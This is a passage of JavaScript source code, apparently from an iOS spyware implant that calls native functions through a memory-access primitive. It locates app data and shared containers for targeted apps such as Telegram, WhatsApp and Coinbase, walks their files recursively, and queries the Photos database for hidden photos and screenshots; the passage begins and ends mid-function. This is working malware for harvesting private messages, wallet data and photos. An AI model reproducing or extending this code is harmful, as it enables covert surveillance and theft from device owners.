stmtPtr);\n\t\t\t\t\t\t}\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"free\", sqlBuf);\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", dbHandlePtr);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", dbPathBuf);\n\t\t}\n\t} catch (e) {\n\t}\n\t\n\treturn bundleIdMap;\n}\n\n/**\n * Get container UUIDs for specific bundle IDs from applicationState.db\n * Query: application_identifier_tab (bundleId -> id), then kvs table (id -> binary plist with UUID)\n * Returns map of bundleId -> { dataUUID, groupUUID, name }\n */\nfunction getContainerPathsForBundleIds(bundleIds) {\n\tconst containerMap = {};\n\tconst dbPath = \"/private/var/mobile/Library/FrontBoard/applicationState.db\";\n\t\n\tfor (let i = 0; i < bundleIds.length; i++) {\n\t}\n\t\n\ttry {\n\t\tconst dbPathBuf = Native.callSymbol(\"malloc\", dbPath.length + 1);\n\t\tif (!dbPathBuf || dbPathBuf === 0n) return containerMap;\n\t\t\n\t\ttry {\n\t\t\tNative.writeString(dbPathBuf, dbPath);\n\t\t\t\n\t\t\tconst SQLITE_OK = 0;\n\t\t\tconst SQLITE_ROW = 100;\n\t\t\tconst SQLITE_DONE = 101;\n\t\t\tconst SQLITE_OPEN_READONLY = 1;\n\t\t\t\n\t\t\tconst dbHandlePtr = Native.callSymbol(\"malloc\", 8n);\n\t\t\tif (!dbHandlePtr || dbHandlePtr === 0n) return containerMap;\n\t\t\t\n\t\t\ttry {\n\t\t\t\tNative.write64(dbHandlePtr, 0n);\n\t\t\t\t\n\t\t\t\tconst openResult = Native.callSymbol(\"sqlite3_open_v2\", dbPathBuf, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);\n\t\t\t\tif (Number(openResult) !== SQLITE_OK) {\n\t\t\t\t\treturn containerMap;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tconst dbHandle = Native.readPtr(dbHandlePtr);\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\t// For each bundle ID, query the database\n\t\t\t\t\tfor (const bundleId of bundleIds) {\n\t\t\t\t\t\t\n\t\t\t\t\t\t// Step 1: Get ID from application_identifier_tab\n\t\t\t\t\t\tconst sql1 = \"SELECT id FROM application_identifier_tab WHERE application_identifier = ?\";\n\t\t\t\t\t\tconst sql1Buf = Native.callSymbol(\"malloc\", sql1.length + 1);\n\t\t\t\t\t\tif (!sql1Buf || sql1Buf === 0n) continue;\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tNative.writeString(sql1Buf, sql1);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tconst stmt1Ptr = Native.callSymbol(\"malloc\", 8n);\n\t\t\t\t\t\t\tif (!stmt1Ptr || stmt1Ptr === 0n) continue;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tNative.write64(stmt1Ptr, 0n);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst prepResult = Native.callSymbol(\"sqlite3_prepare_v2\", dbHandle, sql1Buf, -1, stmt1Ptr, 0n);\n\t\t\t\t\t\t\t\tif (Number(prepResult) !== SQLITE_OK) continue;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tconst stmt1 = Native.readPtr(stmt1Ptr);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Bind bundle ID parameter\n\t\t\t\t\t\t\t\tconst bundleIdBuf = Native.callSymbol(\"malloc\", bundleId.length + 1);\n\t\t\t\t\t\t\t\tif (bundleIdBuf && bundleIdBuf !== 0n) {\n\t\t\t\t\t\t\t\t\tNative.writeString(bundleIdBuf, bundleId);\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_bind_text\", stmt1, 1, bundleIdBuf, -1, 0n);\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tconst stepResult = Native.callSymbol(\"sqlite3_step\", stmt1);\n\t\t\t\t\t\t\t\t\tif (Number(stepResult) === SQLITE_ROW) {\n\t\t\t\t\t\t\t\t\t\tconst appId = Native.callSymbol(\"sqlite3_column_int\", stmt1, 0);\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t// Step 2: Query kvs table for container info\n\t\t\t\t\t\t\t\t\t\t// The value column contains a binary plist with UUID info\n\t\t\t\t\t\t\t\t\t\tconst sql2 = \"SELECT key, value FROM kvs WHERE application_identifier = ?\";\n\t\t\t\t\t\t\t\t\t\tconst sql2Buf = Native.callSymbol(\"malloc\", sql2.length + 1);\n\t\t\t\t\t\t\t\t\t\tif (sql2Buf && sql2Buf !== 0n) {\n\t\t\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\t\t\tNative.writeString(sql2Buf, sql2);\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\tconst stmt2Ptr = Native.callSymbol(\"malloc\", 8n);\n\t\t\t\t\t\t\t\t\t\t\t\tif (stmt2Ptr && stmt2Ptr !== 0n) {\n\t\t\t\t\t\t\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tNative.write64(stmt2Ptr, 0n);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst prepResult2 = Native.callSymbol(\"sqlite3_prepare_v2\", dbHandle, sql2Buf, -1, stmt2Ptr, 0n);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (Number(prepResult2) === SQLITE_OK) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst stmt2 = Native.readPtr(stmt2Ptr);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_bind_int\", stmt2, 1, appId);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Scan all kvs entries for this app\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tlet kvsCount = 0;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\twhile (true) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst stepResult2 = Native.callSymbol(\"sqlite3_step\", stmt2);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (Number(stepResult2) !== SQLITE_ROW) break;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tkvsCount++;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst keyPtr = Native.callSymbol(\"sqlite3_column_text\", stmt2, 0);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst key = keyPtr && keyPtr !== 0n ? Native.readString(keyPtr, 256) : \"\";\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Get binary plist data\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst valuePtr = Native.callSymbol(\"sqlite3_column_blob\", stmt2, 1);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst valueSize = Native.callSymbol(\"sqlite3_column_bytes\", stmt2, 1);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (valuePtr && valuePtr !== 0n && Number(valueSize) > 0) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Read binary plist as bytes\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst plistData = Native.read(valuePtr, Number(valueSize));\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Try to extract UUID from binary plist using string search\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// UUIDs are in format XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst plistStr = String.fromCharCode.apply(null, Array.from(new Uint8Array(plistData)));\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst uuidRegex = /[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}/gi;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst uuids = plistStr.match(uuidRegex);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (uuids && uuids.length > 0) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Store UUIDs found in this entry\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (!containerMap[bundleId]) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcontainerMap[bundleId] = { name: bundleId };\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Try to determine if this is data or group container UUID\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfor (const uuid of uuids) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Check if this UUID exists in Data/Application\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst dataPath = \"/private/var/mobile/Containers/Data/Application/\" + uuid;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (fileExists(dataPath)) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcontainerMap[bundleId].dataPath = dataPath;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcontainerMap[bundleId].dataUUID = uuid;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Check if this UUID exists in Shared/AppGroup\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tconst groupPath = \"/private/var/mobile/Containers/Shared/AppGroup/\" + uuid;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (fileExists(groupPath)) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcontainerMap[bundleId].groupPath = groupPath;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tcontainerMap[bundleId].groupUUID = uuid;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif (kvsCount === 0) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_finalize\", stmt2);\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", stmt2Ptr);\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", sql2Buf);\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", bundleIdBuf);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tNative.callSymbol(\"sqlite3_finalize\", stmt1);\n\t\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", stmt1Ptr);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} finally {\n\t\t\t\t\t\t\tNative.callSymbol(\"free\", sql1Buf);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", dbHandlePtr);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", dbPathBuf);\n\t\t}\n\t} catch (e) {\n\t}\n\t\n\t\n\tconst dataDirs = [\n\t\t\"/private/var/mobile/Containers/Data/Application\",\n\t\t\"/var/mobile/Containers/Data/Application\"\n\t];\n\t\n\tfor (const dataDir of dataDirs) {\n\t\tconst dir = Native.callSymbol(\"opendir\", dataDir);\n\t\tif (!dir || dir === 0n) continue;\n\t\t\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\tconst containerPath = dataDir + \"/\" + name;\n\t\t\t\tconst metadataPath = containerPath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\t\n\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\tconst bundleId = metadata.MCMMetadataIdentifier;\n\t\t\t\t\t\n\t\t\t\t\t// Check if this is one of the bundle IDs we're looking for\n\t\t\t\t\tfor (const targetId of bundleIds) {\n\t\t\t\t\t\tif (bundleId.toLowerCase() === targetId.toLowerCase()) {\n\t\t\t\t\t\t\tif (!containerMap[bundleId]) {\n\t\t\t\t\t\t\t\tcontainerMap[bundleId] = {};\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tcontainerMap[bundleId].dataPath = containerPath;\n\t\t\t\t\t\t\tcontainerMap[bundleId].dataUUID = name;\n\t\t\t\t\t\t\tcontainerMap[bundleId].name = metadata.CFBundleName || metadata.CFBundleDisplayName || bundleId;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\t}\n\t\n\t// Scan Shared/AppGroup containers\n\tconst appGroupDirs = [\n\t\t\"/private/var/mobile/Containers/Shared/AppGroup\",\n\t\t\"/var/mobile/Containers/Shared/AppGroup\"\n\t];\n\t\n\tlet appGroupScanned = 0;\n\tlet appGroupWithMeta = 0;\n\t\n\t// Log what we're looking for\n\tfor (let i = 0; i < bundleIds.length; i++) {\n\t}\n\t\n\tfor (const appGroupDir of appGroupDirs) {\n\t\tconst dir = Native.callSymbol(\"opendir\", appGroupDir);\n\t\tif (!dir || dir === 0n) {\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\t\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\t// Check if it looks like a UUID (36 chars)\n\t\t\t\tif (name.length !== 36) continue;\n\t\t\t\t\n\t\t\t\tappGroupScanned++;\n\t\t\t\tconst containerPath = appGroupDir + \"/\" + name;\n\t\t\t\tconst metadataPath = containerPath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\t\n\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\tappGroupWithMeta++;\n\t\t\t\t\tconst bundleId = metadata.MCMMetadataIdentifier;\n\t\t\t\t\tconst bundleIdLower = bundleId.toLowerCase();\n\t\t\t\t\t\n\t\t\t\t\t// Log first 10 and any telegram-related to debug\n\t\t\t\t\tif (appGroupWithMeta <= 10 || bundleIdLower.indexOf(\"telegra\") !== -1 || bundleIdLower.indexOf(\"whatsapp\") !== -1) {\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// Check if this is one of the bundle IDs we're looking for\n\t\t\t\t\tlet matched = false;\n\t\t\t\t\tfor (const targetId of bundleIds) {\n\t\t\t\t\t\tconst targetLower = targetId.toLowerCase();\n\t\t\t\t\t\tif (bundleIdLower === targetLower) {\n\t\t\t\t\t\t\tmatched = true;\n\t\t\t\t\t\t\tif (!containerMap[bundleId]) {\n\t\t\t\t\t\t\t\tcontainerMap[bundleId] = {};\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tcontainerMap[bundleId].groupPath = containerPath;\n\t\t\t\t\t\t\tcontainerMap[bundleId].groupUUID = name;\n\t\t\t\t\t\t\tcontainerMap[bundleId].name = metadata.CFBundleName || metadata.CFBundleDisplayName || bundleId;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// Debug: If it's telegram but didn't match, show why\n\t\t\t\t\tif (!matched && bundleIdLower.indexOf(\"telegra\") !== -1) {\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\t// Log UUID without metadata\n\t\t\t\t\tif (appGroupScanned <= 5) {\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\t}\n\t\n\t\n\t// Log final results\n\tfor (const bundleId of Object.keys(containerMap)) {\n\t\tconst c = containerMap[bundleId];\n\t}\n\treturn containerMap;\n}\n\n/**\n * Find all app data containers matching a pattern\n * Searches by bundle ID and app name in plist files\n */\nfunction findMatchingAppContainers(pattern) {\n\tconst results = [];\n\tconst patternLower = pattern.toLowerCase();\n\t\n\t// Search both Data/Application AND Shared/AppGroup containers\n\tconst searchDirs = [\n\t\t\"/private/var/mobile/Containers/Data/Application\",\n\t\t\"/var/mobile/Containers/Data/Application\",\n\t\t\"/private/var/mobile/Containers/Shared/AppGroup\",\n\t\t\"/var/mobile/Containers/Shared/AppGroup\"\n\t];\n\t\n\tfor (const searchDir of searchDirs) {\n\t\tconst dir = Native.callSymbol(\"opendir\", searchDir);\n\t\tif (!dir || dir === 0n) {\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tlet containerCount = 0;\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\tcontainerCount++;\n\t\t\t\tconst containerPath = searchDir + \"/\" + name;\n\t\t\t\tconst metadataPath = containerPath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\t\n\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\tconst bundleId = metadata.MCMMetadataIdentifier.toLowerCase();\n\t\t\t\t\tconst appName = (metadata.CFBundleName || metadata.CFBundleDisplayName || \"\").toLowerCase();\n\t\t\t\t\t\n\t\t\t\t\t// Check if bundle ID OR app name contains the pattern (empty pattern matches all)\n\t\t\t\t\tconst matchesBundleId = bundleId.indexOf(patternLower) !== -1;\n\t\t\t\t\tconst matchesAppName = appName.indexOf(patternLower) !== -1;\n\t\t\t\t\t\n\t\t\t\t\tif (patternLower === \"\" || matchesBundleId || matchesAppName) {\n\t\t\t\t\t\tresults.push({\n\t\t\t\t\t\t\tpath: containerPath,\n\t\t\t\t\t\t\tbundleId: metadata.MCMMetadataIdentifier,\n\t\t\t\t\t\t\tname: metadata.CFBundleName || metadata.CFBundleDisplayName || metadata.MCMMetadataIdentifier\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t// Log only for first pattern to avoid spam\n\t\t\tif (pattern === \"coinbase\") {\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\t}\n\t\n\treturn results;\n}\n\n/**\n * Find all shared containers (AppGroup) matching a pattern\n */\nfunction findMatchingSharedContainers(pattern) {\n\tconst results = [];\n\tconst patternLower = pattern.toLowerCase();\n\t\n\tconst searchDirs = [\n\t\t\"/private/var/mobile/Containers/Shared/AppGroup\",\n\t\t\"/var/mobile/Containers/Shared/AppGroup\"\n\t];\n\t\n\tfor (const searchDir of searchDirs) {\n\t\tconst dir = Native.callSymbol(\"opendir\", searchDir);\n\t\tif (!dir || dir === 0n) continue;\n\t\t\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\tconst containerPath = searchDir + \"/\" + name;\n\t\t\t\tconst metadataPath = containerPath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\t\t\t\n\t\t\t\tconst metadata = readInfoPlist(metadataPath);\n\t\t\t\tif (metadata && metadata.MCMMetadataIdentifier) {\n\t\t\t\t\tconst identifier = metadata.MCMMetadataIdentifier.toLowerCase();\n\t\t\t\t\t\n\t\t\t\t\t// Check if identifier contains the pattern\n\t\t\t\t\tif (identifier.indexOf(patternLower) !== -1) {\n\t\t\t\t\t\tresults.push({\n\t\t\t\t\t\t\tpath: containerPath,\n\t\t\t\t\t\t\tbundleId: metadata.MCMMetadataIdentifier,\n\t\t\t\t\t\t\tname: metadata.CFBundleName || metadata.CFBundleDisplayName || metadata.MCMMetadataIdentifier\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\t}\n\t\n\treturn results;\n}\n\n/**\n * List all files in a directory recursively (up to maxDepth)\n */\nfunction listFilesRecursive(dirPath, maxDepth, currentDepth) {\n\tconst files = [];\n\tif (currentDepth > maxDepth) return files;\n\t\n\tconst dir = Native.callSymbol(\"opendir\", dirPath);\n\tif (!dir || dir === 0n) return files;\n\t\n\ttry {\n\t\twhile (true) {\n\t\t\tconst entry = Native.callSymbol(\"readdir\", dir);\n\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\n\t\t\tconst name = readDirentName(entry);\n\t\t\tif (!name || name.length === 0 || name === \".\" || name === \"..\") continue;\n\t\t\t\n\t\t\tconst fullPath = dirPath + \"/\" + name;\n\t\t\t\n\t\t\t// Check if directory or file using stat\n\t\t\tconst statBuf = Native.callSymbol(\"malloc\", 144);\n\t\t\tif (!statBuf || statBuf === 0n) continue;\n\t\t\t\n\t\t\ttry {\n\t\t\t\tconst ret = Native.callSymbol(\"stat\", fullPath, statBuf);\n\t\t\t\tif (ret !== 0) continue;\n\t\t\t\t\n\t\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\t\tconst statView = new DataView(statData);\n\t\t\t\tconst mode = statView.getUint16(4, true); // st_mode\n\t\t\t\t\n\t\t\t\tconst isDir = (mode & 0xF000) === 0x4000;  // S_ISDIR\n\t\t\t\tconst isFile = (mode & 0xF000) === 0x8000; // S_ISREG\n\t\t\t\t\n\t\t\t\tif (isFile) {\n\t\t\t\t\tconst size = Number(statView.getBigUint64(96, true)); // st_size\n\t\t\t\t\tfiles.push({ path: fullPath, size: size });\n\t\t\t\t} else if (isDir) {\n\t\t\t\t\t// Recurse into subdirectory\n\t\t\t\t\tconst subFiles = listFilesRecursive(fullPath, maxDepth, currentDepth + 1);\n\t\t\t\t\tfor (const f of subFiles) {\n\t\t\t\t\t\tfiles.push(f);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t\t}\n\t\t}\n\t} finally {\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\t\n\treturn files;\n}\n\n/**\n * Query Photos.sqlite database for hidden photos or screenshots\n * @param isHidden - true for hidden photos, false for screenshots\n * @returns array of full file paths\n */\nfunction queryPhotosDatabase(isHidden) {\n\tconst filePaths = [];\n\tconst dbPath = \"/var/mobile/Media/PhotoData/Photos.sqlite\";\n\t\n\t\n\ttry {\n\t\tconst SQLITE_OK = 0;\n\t\tconst SQLITE_ROW = 100;\n\t\tconst SQLITE_OPEN_READONLY = 1;\n\t\t\n\t\t// Open database\n\t\tconst dbHandlePtr = Native.callSymbol(\"malloc\", 8);\n\t\tif (!dbHandlePtr || dbHandlePtr === 0n) return filePaths;\n\t\t\n\t\ttry {\n\t\t\tNative.write64(dbHandlePtr, 0n);\n\t\t\t\n\t\t\tconst openResult = Native.callSymbol(\"sqlite3_open_v2\", dbPath, dbHandlePtr, SQLITE_OPEN_READONLY, 0n);\n\t\t\t\n\t\t\tif (Number(openResult) !== SQLITE_OK) {\n\t\t\t\treturn filePaths;\n\t\t\t}\n\t\t\t\n\t\t\tconst dbHandle = Native.readPtr(dbHandlePtr);\n\t\t\tif (!dbHandle || dbHandle === 0n) {\n\t\t\t\treturn filePaths;\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\t// Query for hidden photos or screenshots\n\t\t\t\tconst sql = isHidden \n\t\t\t\t\t? \"SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZHIDDEN = 1 ORDER BY ZDATECREATED\"\n\t\t\t\t\t: \"SELECT ZFILENAME, ZDIRECTORY FROM ZASSET WHERE ZISDETECTEDSCREENSHOT = 1 ORDER BY ZDATECREATED\";\n\t\t\t\t\n\t\t\t\tconst stmtPtr = Native.callSymbol(\"malloc\", 8);\n\t\t\t\tif (!stmtPtr || stmtPtr === 0n) return filePaths;\n\t\t\t\t\n\t\t\t\ttry {\n\t\t\t\t\tNative.write64(stmtPtr, 0n);\n\t\t\t\t\t\n\t\t\t\t\tconst prepResult = Native.callSymbol(\"sqlite3_prepare_v2\", dbHandle, sql, -1, stmtPtr, 0n);\n\t\t\t\t\tif (Number(prepResult) !== SQLITE_OK) {\n\t\t\t\t\t\treturn filePaths;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tconst stmt = Native.readPtr(stmtPtr);\n\t\t\t\t\tif (!stmt || stmt === 0n) return filePaths;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\twhile (Number(Native.callSymbol(\"sqlite3_step\", stmt)) === SQLITE_ROW) {\n\t\t\t\t\t\t\tconst filenamePtr = Native.callSymbol(\"sqlite3_column_text\", stmt, 0);\n\t\t\t\t\t\t\tconst directoryPtr = Native.callSymbol(\"sqlite3_column_text\", stmt, 1);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif (filenamePtr && filenamePtr !== 0n) {\n\t\t\t\t\t\t\t\tconst filename = Native.readString(filenamePtr, 256).replace(/\\0/g, '');\n\t\t\t\t\t\t\t\tlet directory = \"\";\n\t\t\t\t\t\t\t\tif (directoryPtr && directoryPtr !== 0n) {\n\t\t\t\t\t\t\t\t\tdirectory = Native.readString(directoryPtr, 512).replace(/\\0/g, '');\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (filename) {\n\t\t\t\t\t\t\t\t\tlet fullPath;\n\t\t\t\t\t\t\t\t\tif (directory) {\n\t\t\t\t\t\t\t\t\t\tdirectory = directory.replace(/^\\/+|\\/+$/g, '');\n\t\t\t\t\t\t\t\t\t\tfullPath = \"/var/mobile/Media/\" + directory + \"/\" + filename;\n\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\tfullPath = \"/var/mobile/Media/DCIM/100APPLE/\" + filename;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tfilePaths.push(fullPath);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"sqlite3_finalize\", stmt);\n\t\t\t\t\t}\n\t\t\t\t} finally {\n\t\t\t\t\tNative.callSymbol(\"free\", stmtPtr);\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"sqlite3_close\", dbHandle);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", dbHandlePtr);\n\t\t}\n\t} catch (e) {\n\t}\n\t\n\treturn 